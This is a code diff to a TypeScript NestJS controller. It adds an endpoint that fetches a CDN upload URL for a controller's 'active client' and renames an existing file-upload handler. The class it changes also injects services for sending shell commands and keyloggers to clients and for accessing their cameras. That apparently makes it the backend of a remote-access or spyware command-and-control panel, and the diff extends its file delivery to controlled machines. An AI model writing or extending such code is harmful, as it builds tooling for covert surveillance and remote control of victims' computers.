@@ -26,6 +26,8 @@ import { ControllerAuthorizationGuard } from "../../application/guards/Controlle
 import { CamerasUseCase } from "../../application/events/cameras.use-case";
 import { MessageBotGuard } from "../../application/guards/MessageBot.guard";
 import type { FastifyRequest } from "fastify";
+import { UploadCdnUseCase } from "@/src/modules/cdn/application/upload-cdn.use-case";
+import { ControllerRepository } from "@/src/repository/db/controller/controller.repository";
 
 
 @UseGuards(ControllerAuthorizationGuard)
@@ -37,6 +39,8 @@ export class ControllerEvents {
     private readonly sendCmdToClientUseCase: SendCmdCommandToClientUseCase,
     private readonly sendKeyloggerToClientUseCase: SendKeyloggerToClientUseCase,
     private readonly camerasUseCase: CamerasUseCase,
+    private readonly uploadCdnUseCase: UploadCdnUseCase,
+    private readonly controllerRepository: ControllerRepository,
   ) { }
 
 
@@ -44,12 +48,35 @@ export class ControllerEvents {
 
   @UseGuards(ClientPermissionGuard)
   @Post(":controllerid/upload-file")
-  async getCurrentClient(
+  async uploadFileToClient(
     @Param("controllerid") controllerid: string,
     @Body() body: SendFileToClientDto,
   ) {
     return await this.fileToClientUseCase.sendFileToClient(controllerid, body);
   }
+
+  @UseGuards(ClientPermissionGuard)
+  @Post(":controllerid/upload-large-file")
+  async uploadLargeFileToClient(
+    @Param("controllerid") controllerid: string,
+
+
+  ) {
+
+    console.log("uploadLargeFileToClient", controllerid);
+    const activeclient = (
+      await this.controllerRepository.getControllerById(controllerid)
+    ).activeclient;
+
+    if (!activeclient) return null
+    const res = await this.uploadCdnUseCase.getUploadUrl(activeclient);
+    console.log("res", res);
+    return res
+  }
+
+
+
+
 
   @UseGuards(ClientPermissionGuard)
   @Post(":controllerid/file")
